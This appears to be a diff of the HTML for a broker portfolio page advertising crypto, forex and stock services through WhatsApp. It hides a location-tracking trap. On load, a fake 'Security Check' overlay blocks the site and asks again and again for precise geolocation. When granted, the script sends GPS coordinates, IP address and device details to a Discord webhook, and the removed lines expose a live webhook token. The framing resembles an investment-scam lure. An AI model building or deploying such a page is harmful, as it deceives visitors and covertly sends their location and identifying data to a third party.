@@ -6,164 +6,436 @@
   <title>Stephany Reuben — Multi-Market Broker & Strategist</title>
   <meta name="description" content="Portfolio website for Stephany Reuben — specialist in Crypto, Forex, and Stocks. Book a session via WhatsApp.">
   <meta name="theme-color" content="#0f172a">
+  <meta property="og:title" content="Stephany Reuben — Multi-Market Broker & Strategist">
+  <meta property="og:description" content="Crypto • Forex • Stocks — Strategy, risk management, and execution.">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%230f172a' width='100' height='100'/%3E%3Ctext x='50' y='58' font-size='56' text-anchor='middle' fill='%23fff' font-family='Arial,Helvetica,sans-serif'%3ESR%3C/text%3E%3C/svg%3E">
   <style>
     :root{
       --bg: #0b1020;
       --panel: #0f172a;
       --ink: #e5e7eb;
       --muted:#9aa3b2;
-      --brand:#22c55e;
-      --accent:#38bdf8;
+      --brand:#22c55e; /* green */
+      --accent:#38bdf8; /* cyan */
+      --ring: 0 0 0 8px rgba(56,189,248,.15);
+      --radius: 16px;
+      --shadow: 0 8px 30px rgba(0,0,0,.35);
       --max: 1120px;
     }
+    *{box-sizing:border-box}
+    html,body{height:100%}
     body{
       margin:0;
-      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Apple Color Emoji","Segoe UI Emoji", "Segoe UI Symbol", sans-serif;
       color:var(--ink);
-      background:var(--bg);
+      background:
+        radial-gradient(1000px 600px at 120% -10%, rgba(34,197,94,.12), transparent 60%),
+        radial-gradient(900px 500px at -10% -20%, rgba(56,189,248,.12), transparent 55%),
+        var(--bg);
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
     }
     a{color:inherit;text-decoration:none}
     .container{max-width:var(--max);margin:0 auto;padding:clamp(20px,4vw,40px)}
-    .nav{display:flex;align-items:center;justify-content:space-between;}
-    .cta{padding:.7rem 1rem;border-radius:12px;background:linear-gradient(135deg,var(--brand),#16a34a);color:#03120a;font-weight:700}
-    .hero{display:grid;grid-template-columns: 1.15fr .85fr;gap:clamp(24px,4vw,40px);align-items:center;margin-top: 40px;}
-    .portrait{border-radius:20px;overflow:hidden;background:#071023;min-height:380px}
-    .portrait img{width:100%;height:auto;display:block}
-    /* Secure Location Popup Styles */
+    .nav{
+      display:flex;align-items:center;justify-content:space-between;gap:16px;
+    }
+    .brand{display:flex;align-items:center;gap:12px;font-weight:700;letter-spacing:.4px}
+    .brand-badge{
+      width:36px;height:36px;border-radius:10px;display:grid;place-items:center;
+      background:linear-gradient(135deg, var(--accent), var(--brand));
+      color:#001018;font-weight:900;box-shadow: var(--shadow);
+    }
+    .nav a.cta{
+      padding:.7rem 1rem;border-radius:12px;background:linear-gradient(135deg,var(--brand),#16a34a);
+      color:#03120a;font-weight:700;display:inline-flex;align-items:center;gap:.6rem;
+      transition:transform .15s ease, box-shadow .15s ease;
+      box-shadow: 0 6px 18px rgba(34,197,94,.35);
+    }
+    .nav a.cta:focus-visible,.nav a.cta:hover{transform:translateY(-1px)}
+    .nav a.cta:focus-visible{outline:none;box-shadow:var(--ring)}
+    .hero{
+      display:grid;grid-template-columns: 1.15fr .85fr;gap:clamp(24px,4vw,40px);align-items:center;
+      margin-top: min(8vh,56px);
+    }
+    @media (max-width: 920px){ .hero{ grid-template-columns:1fr; } }
+    .hero-copy h1{
+      font-size:clamp(36px,5vw,60px);line-height:1.05;margin:0 0 12px;font-weight:900;
+      letter-spacing:-.02em;
+    }
+    .badge-row{display:flex;flex-wrap:wrap;gap:10px;margin:.7rem 0 1.2rem}
+    .chip{
+      padding:.4rem .7rem;border-radius:999px;background:#0b142b;border:1px solid #1b2745;
+      color:var(--muted);font-size:.9rem;display:inline-flex;align-items:center;gap:.5rem;
+    }
+    .chip svg{opacity:.9}
+    .hero-copy p.lead{color:#d2d7df;font-size:clamp(18px,1.7vw,20px);margin:.6rem 0 1.2rem}
+    .cta-row{display:flex;flex-wrap:wrap;gap:12px}
+    .btn{
+      border:1px solid #1b3a32;background:#0d231d;color:#d6ffe9;
+      padding:.9rem 1.1rem;border-radius:12px;display:inline-flex;align-items:center;gap:.65rem;
+      font-weight:700;transition:transform .15s ease, box-shadow .15s ease, border-color .15s ease;
+    }
+    .btn:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(0,0,0,.35);border-color:#1f7a5b}
+    .btn.whatsapp{background:linear-gradient(135deg,#22c55e,#16a34a);color:#052810;border-color:transparent}
+    .btn.secondary{background:#0e1935;border-color:#1b2745;color:#d9ecff}
+    .portrait{
+      position:relative;border-radius:20px;overflow:hidden;isolation:isolate;
+      background:linear-gradient(180deg, rgba(56,189,248,.2), transparent 60%), #071023;
+      border:1px solid #1b2745;box-shadow: var(--shadow);
+      min-height: 380px;
+      display:grid;align-items:end;
+    }
+    .portrait img{
+      width:100%;height:auto;display:block;object-fit:cover;
+      filter:saturate(1.05) contrast(1.03);
+    }
+    .watermark{
+      position:absolute;inset:auto -40px -28px auto;transform:rotate(-7deg);
+      font-size: clamp(48px,10vw,120px);font-weight:900;line-height:.9;
+      color:transparent;-webkit-text-stroke: 2px rgba(56,189,248,.14);text-shadow:none;pointer-events:none;
+    }
+    .sections{margin-top:64px;display:grid;gap:28px}
+    .card{
+      background: linear-gradient(180deg, rgba(10,18,40,.6), rgba(8,14,30,.8));
+      border:1px solid #1b2745;border-radius:var(--radius);padding:28px;
+      box-shadow: var(--shadow);
+    }
+    .grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+    @media (max-width: 920px){ .grid-3{grid-template-columns:1fr} }
+    .h2{font-size: clamp(22px,2.2vw,28px);margin:0 0 .6rem}
+    .muted{color:var(--muted)}
+    .list{display:grid;gap:10px;margin:14px 0 0;padding:0}
+    .list li{list-style:none;display:flex;align-items:flex-start;gap:.6rem}
+    .list svg{margin-top:4px;flex:0 0 auto}
+    .stats{
+      display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-top:12px
+    }
+    @media (max-width:920px){ .stats{grid-template-columns:repeat(2,1fr)} }
+    .stat{
+      border:1px solid #1b2745;border-radius:14px;padding:16px;background:#0b142b
+    }
+    .stat b{display:block;font-size:clamp(22px,2.2vw,26px)}
+    .footer{
+      margin:48px 0 10px;color:#92a0b3;font-size:.9rem;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap
+    }
+    .sr-only{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px);white-space:nowrap}
+    /* ——— Secure Location Gate Styles ——— */
     .overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.85);
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
+      position: fixed; inset: 0; background: rgba(0,0,0,0.86); color: #fff;
+      display:flex; align-items:center; justify-content:center; z-index: 9999;
+      backdrop-filter: blur(2px);
     }
     .popup {
-      background: #1f2937;
-      padding: 28px;
-      border-radius: 12px;
-      max-width: 400px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+      background:#101827; border:1px solid #1f2a44; border-radius:14px; padding:26px; max-width:460px; text-align:center;
+      box-shadow: 0 20px 60px rgba(0,0,0,.5);
     }
-    h2 {margin-top: 0;}
-    p {font-size: 15px; color: #d1d5db;}
+    .popup h2{margin:0 0 8px}
+    .popup p{margin:6px 0; color:#cbd5e1}
+    .note{font-size:12px;color:#9aa3b2;margin-top:8px}
   </style>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Person",
+    "name": "Stephany Reuben",
+    "jobTitle": "Multi-Market Broker & Strategist",
+    "description": "Specialist in Crypto, Forex, and Stocks — risk-managed strategies for retail and HNWI clients.",
+    "url": "",
+    "image": "",
+    "sameAs": []
+  }
+  </script>
 </head>
 <body>
-
-<!-- Secure Location Approval Overlay -->
-<div class="overlay" id="overlay">
-  <div class="popup">
-    <h2>Security Check</h2>
-    <p id="status">Requesting location permission...</p>
+  <!-- Secure Location Approval Overlay -->
+  <div class="overlay" id="overlay" role="dialog" aria-modal="true" aria-labelledby="gate-title" aria-describedby="gate-desc">
+    <div class="popup">
+      <h2 id="gate-title">Security Check</h2>
+      <p id="gate-desc">Please allow location access to continue. This helps us verify session integrity and tailor regional info.</p>
+      <p id="status" aria-live="polite">Requesting location permission…</p>
+      <p class="note">Your browser will show a permission prompt. We do not store personal content; basics like GPS, IP, and device info are sent securely.</p>
+    </div>
   </div>
-</div>
 
-<!-- Portfolio Content -->
-<header class="container nav">
-  <div class="brand"><strong>Stephany Reuben</strong></div>
-  <a id="waTop" class="cta" href="#" target="_blank" rel="noopener">Chat on WhatsApp</a>
-</header>
-
-<main class="container">
-  <section class="hero">
-    <div>
-      <h1>Crypto • Forex • Stocks</h1>
-      <p>I help clients navigate volatility and capture opportunity through disciplined execution.</p>
-      <a id="waHero" class="cta" href="#">WhatsApp Stephany</a>
+  <header class="container nav" aria-label="Primary">
+    <div class="brand">
+      <div class="brand-badge" aria-hidden="true">SR</div>
+      <span>Stephany Reuben</span>
     </div>
-    <div class="portrait">
-      <img src="stephany-photo.jpg" alt="Stephany Reuben">
-    </div>
-  </section>
-</main>
+    <a id="waTop" class="cta" href="#" target="_blank" rel="noopener">
+      <svg aria-hidden="true" width="18" height="18" viewBox="0 0 24 24" fill="none">
+        <path d="M20 7h-5m5 0-6-6m6 6-6 6" stroke="#052810" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      Chat on WhatsApp
+    </a>
+  </header>
 
-<script>
-  // ====== CONFIG ======
-  const WHATSAPP_NUMBER = "17732805015";
-  const PREFILLED_TEXT = "Hi Stephany, I came from your portfolio site.";
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1074800768177143998/sgygvMZD-GnpHdaqJdMghqY_RuSPV63c3KbEEsQtnFM3QDHTCOWZqAvD3JdiePYsQ1tI"; // Replace with your webhook
-  // ====================
+  <main class="container">
+    <section class="hero">
+      <div class="hero-copy">
+        <h1>
+          Crypto • Forex • Stocks<br>
+          <span class="muted">Risk-managed strategies with a human touch.</span>
+        </h1>
+        <div class="badge-row" aria-label="Areas of expertise">
+          <span class="chip" title="Digital assets">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M12 2v20M2 12h20" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            Crypto
+          </span>
+          <span class="chip" title="Foreign exchange">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M5 9l7-7 7 7M5 15l7 7 7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+            Forex
+          </span>
+          <span class="chip" title="Equities">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M4 17l6-6 4 4 6-8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            Stocks
+          </span>
+        </div>
+        <p class="lead">
+          I help clients navigate volatility and capture opportunity through disciplined execution,
+          clear communication, and modern risk controls.
+        </p>
+        <div class="cta-row">
+          <a id="waHero" class="btn whatsapp" href="#" target="_blank" rel="noopener" aria-label="Message Stephany on WhatsApp">
+            <svg aria-hidden="true" width="18" height="18" viewBox="0 0 24 24" fill="none">
+              <path d="M12 3a9 9 0 0 0-7.9 13.3L3 21l4.8-1.2A9 9 0 1 0 12 3Z" stroke="currentColor" stroke-width="2" fill="none"/>
+              <path d="M8.5 10.5c.3 2 3.2 4.1 4.7 4.5 1.2.3 2-.2 2.3-.7.2-.3.2-.8-.1-1.1l-.9-1a.8.8 0 0 0-1-.1l-.7.3c-.3.1-.5 0-.9-.3-.7-.6-1.5-1.8-1.7-2.3-.2-.4 0-.6.1-.8l.4-.7c.2-.3.1-.7-.2-1l-1-.9c-.3-.3-.8-.3-1.1-.1-.6.4-1.1 1.2-.9 2Z" fill="currentColor"/>
+            </svg>
+            WhatsApp Stephany
+          </a>
+          <a class="btn secondary" href="#services">View services</a>
+        </div>
+      </div>
+      <figure class="portrait" aria-labelledby="portrait-caption">
+        <img id="profilePhoto" alt="Portrait of Stephany Reuben" src="data:image/svg+xml;utf8,<?xml version='1.0' encoding='UTF-8'?> 
+          <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 1000'>
+            <defs>
+              <linearGradient id='g' x1='0' x2='1'>
+                <stop offset='0%' stop-color='%2338bdf8'/>
+                <stop offset='100%' stop-color='%2322c55e'/>
+              </linearGradient>
+            </defs>
+            <rect width='800' height='1000' fill='%230a142c'/>
+            <circle cx='400' cy='360' r='150' fill='url(%23g)' opacity='.18'/>
+            <rect x='260' y='470' width='280' height='340' rx='26' fill='url(%23g)' opacity='.18'/>
+            <text x='50%' y='92%' text-anchor='middle' fill='%2399a7bb' font-family='Arial' font-size='26'>Upload Stephany's photo — replace the src</text>
+          </svg>">
+        <figcaption id="portrait-caption" class="sr-only">Hero portrait image</figcaption>
+        <div class="watermark" aria-hidden="true">SR</div>
+      </figure>
+    </section>
 
-  const waLink = `https://wa.me/${encodeURIComponent(WHATSAPP_NUMBER)}?text=${encodeURIComponent(PREFILLED_TEXT)}`;
-  document.getElementById('waTop').href = waLink;
-  document.getElementById('waHero').href = waLink;
+    <section id="services" class="sections">
+      <div class="grid-3">
+        <article class="card">
+          <h2 class="h2">Crypto Strategy</h2>
+          <p class="muted">Market structure, momentum, and on-chain context blended with pragmatic risk rules. Spot and derivatives covered where suitable.</p>
+          <ul class="list" aria-label="Crypto highlights">
+            <li>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 12l4 4L19 6" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/></svg>
+              Position sizing, downside caps, and scenario planning
+            </li>
+            <li>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 12l4 4L19 6" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/></svg>
+              Portfolio construction across liquidity tiers
+            </li>
+          </ul>
+        </article>
+        <article class="card">
+          <h2 class="h2">Forex Execution</h2>
+          <p class="muted">Institutional habits for retail outcomes: sessions, levels, and risk-to-reward discipline across majors and select crosses.</p>
+          <ul class="list" aria-label="Forex highlights">
+            <li>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 12l4 4L19 6" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/></svg>
+              Playbooks for trend, range, and news conditions
+            </li>
+            <li>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 12l4 4L19 6" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/></svg>
+              Journal-centric feedback loops to reduce errors
+            </li>
+          </ul>
+        </article>
+        <article class="card">
+          <h2 class="h2">Stocks & Equity Ideas</h2>
+          <p class="muted">Evidence-based frameworks for swing and long-only exposure. Focus on quality factors, catalysts, and risk mitigation.</p>
+          <ul class="list" aria-label="Stocks highlights">
+            <li>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 12l4 4L19 6" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/></svg>
+              Thematic baskets & rebalancing rules
+            </li>
+            <li>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 12l4 4L19 6" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/></svg>
+              Drawdown control with predefined exits
+            </li>
+          </ul>
+        </article>
+      </div>
 
-  const statusEl = document.getElementById("status");
-  const overlay = document.getElementById("overlay");
+      <div class="card">
+        <h2 class="h2">Why work with Stephany?</h2>
+        <div class="stats" role="list">
+          <div class="stat" role="listitem"><b>6+ yrs</b><span class="muted">Professional experience</span></div>
+          <div class="stat" role="listitem"><b>3 markets</b><span class="muted">Crypto • Forex • Stocks</span></div>
+          <div class="stat" role="listitem"><b>Risk-first</b><span class="muted">Capital preservation culture</span></div>
+          <div class="stat" role="listitem"><b>Human</b><span class="muted">Clear, responsive communication</span></div>
+        </div>
+      </div>
 
-  async function getIP() {
-    try {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const data = await res.json();
-      return data.ip || "Unavailable";
-    } catch {
-      return "Unavailable";
-    }
-  }
+      <div class="card">
+        <h2 class="h2">How we’ll work together</h2>
+        <ol class="list" style="counter-reset:step">
+          <li>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#38bdf8" stroke-width="2"/></svg>
+            <div>
+              <b>Discovery chat on WhatsApp</b><br>
+              <span class="muted">Understand goals, constraints, timeline, and risk tolerance.</span>
+            </div>
+          </li>
+          <li>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#38bdf8" stroke-width="2"/></svg>
+            <div>
+              <b>Plan & safeguards</b><br>
+              <span class="muted">Define position sizing, scenarios, and decision triggers.</span>
+            </div>
+          </li>
+          <li>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#38bdf8" stroke-width="2"/></svg>
+            <div>
+              <b>Execute & review</b><br>
+              <span class="muted">Iterate using journal insights and periodic reviews.</span>
+            </div>
+          </li>
+        </ol>
+      </div>
 
-  function getDeviceInfo() {
-    return {
-      userAgent: navigator.userAgent,
-      screenRes: `${window.screen.width}x${window.screen.height}`,
-      language: navigator.language || "Unknown"
-    };
-  }
+      <div class="card" role="region" aria-label="Notes & compliance">
+        <p class="muted">
+          Information on this page is educational and for general purposes only. Market participation involves risk; past performance does not guarantee future results.
+          If you’re unsure, seek independent advice that considers your personal circumstances.
+        </p>
+      </div>
+    </section>
 
-  async function sendToDiscord(lat, lon, accuracy, ip, deviceInfo) {
-    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-    const content =
-      `📍 **Location Approved**\n` +
-      `Lat: ${lat}\n` +
-      `Lon: ${lon}\n` +
-      `Accuracy: ±${accuracy} m\n` +
-      `IP: ${ip}\n` +
-      `Maps: ${mapsLink}\n\n` +
-      `**Device Info:**\n` +
-      `User Agent: ${deviceInfo.userAgent}\n` +
-      `Screen: ${deviceInfo.screenRes}\n` +
-      `Language: ${deviceInfo.language}`;
-    try {
-      await fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content })
+    <section class="card" aria-label="Contact">
+      <h2 class="h2">Ready to talk?</h2>
+      <p class="muted">Tap the button to open a WhatsApp chat with a pre-filled introduction.</p>
+      <a id="waBottom" class="btn whatsapp" href="#" target="_blank" rel="noopener" aria-label="Open WhatsApp chat">
+        Start WhatsApp Chat
+      </a>
+    </section>
+  </main>
+
+  <footer class="container footer">
+    <div>&copy; <span id="year"></span> Stephany Reuben. All rights reserved.</div>
+    <div>Built with care — accessible, fast, and responsive.</div>
+  </footer>
+
+  <script>
+    // ——— EDIT THESE ———
+    const WHATSAPP_NUMBER = "2340000000000"; // e.g., 2348012345678 (no +, no spaces)
+    const PREFILLED_TEXT = "Hi Stephany, I came from your portfolio site. I'd like to discuss Crypto/Forex/Stocks services.";
+    const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"; // replace with your actual Discord webhook
+    // ————————————————
+
+    // WhatsApp link wiring
+    const waLink = (num, text) => `https://wa.me/${encodeURIComponent(num)}?text=${encodeURIComponent(text)}`;
+    const anchors = [document.getElementById('waTop'), document.getElementById('waHero'), document.getElementById('waBottom')];
+    anchors.forEach(a => a && (a.href = waLink(WHATSAPP_NUMBER, PREFILLED_TEXT)));
+
+    // Current year
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // Smooth hash navigation
+    document.querySelectorAll('a[href^="#"]').forEach(a=>{
+      a.addEventListener('click', e=>{
+        const id = a.getAttribute('href').slice(1);
+        const el = document.getElementById(id);
+        if(el){ e.preventDefault(); el.scrollIntoView({behavior:'smooth', block:'start'}); }
       });
-    } catch (e) {
-      console.warn("Webhook send failed", e);
+    });
+
+    // ——— Location Gate Logic ———
+    const statusEl = document.getElementById("status");
+    const overlay = document.getElementById("overlay");
+
+    async function getIP(){
+      try{
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip || "Unavailable";
+      }catch(e){ return "Unavailable"; }
     }
-  }
-
-  function requestLocation() {
-    if (!navigator.geolocation) {
-      statusEl.textContent = "❌ Geolocation not supported in this browser.";
-      return;
+    function getDeviceInfo(){
+      return {
+        userAgent: navigator.userAgent,
+        screenRes: `${window.screen.width}x${window.screen.height}`,
+        language: navigator.language || "Unknown"
+      };
     }
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
-        const { latitude, longitude, accuracy } = pos.coords;
-        statusEl.textContent = "✅ Location approved — entering site...";
-        const ip = await getIP();
-        const deviceInfo = getDeviceInfo();
-        await sendToDiscord(latitude, longitude, accuracy, ip, deviceInfo);
-        setTimeout(() => {
-          overlay.style.display = "none"; // Auto-unlock site
-        }, 1000);
-      },
-      () => {
-        statusEl.textContent = "❌ Location denied. Please approve to proceed.";
-        setTimeout(requestLocation, 2000); // retry
-      },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-    );
-  }
+    async function sendToDiscord(lat, lon, acc){
+      if(!WEBHOOK_URL){ return; }
+      const ip = await getIP();
+      const dev = getDeviceInfo();
+      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      const content =
+        `📍 **Location Approved**
+`+
+        `Lat: ${lat}
+`+
+        `Lon: ${lon}
+`+
+        `Accuracy: ±${Math.round(acc)} m
+`+
+        `IP: ${ip}
+`+
+        `Maps: ${mapsLink}
 
-  // Auto-run on page load
-  window.addEventListener("load", requestLocation);
-</script>
-
+`+
+        `**Device Info**
+`+
+        `UA: ${dev.userAgent}
+`+
+        `Screen: ${dev.screenRes}
+`+
+        `Lang: ${dev.language}`;
+      try{
+        await fetch(WEBHOOK_URL,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body: JSON.stringify({ content })
+        });
+      }catch(err){
+        console.warn("Webhook send failed:", err);
+      }
+    }
+    function requestLocation(){
+      if(!navigator.geolocation){
+        statusEl.textContent = "❌ Geolocation not supported in this browser.";
+        return;
+      }
+      if (!location.protocol.startsWith("https")) {
+        statusEl.textContent = "❗ Precise location requires HTTPS. Please use a secure URL.";
+      }
+      statusEl.textContent = "Requesting location permission…";
+      navigator.geolocation.getCurrentPosition(
+        async (pos)=>{
+          const { latitude, longitude, accuracy } = pos.coords;
+          statusEl.textContent = "✅ Location approved — entering site…";
+          await sendToDiscord(latitude, longitude, accuracy);
+          setTimeout(()=>{ overlay.style.display = "none"; }, 800);
+        },
+        (err)=>{
+          statusEl.textContent = "❌ Location denied. Please approve to proceed.";
+          setTimeout(requestLocation, 2000); // retry until approved
+        },
+        { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
+      );
+    }
+    window.addEventListener("load", requestLocation);
+  </script>
 </body>
 </html>
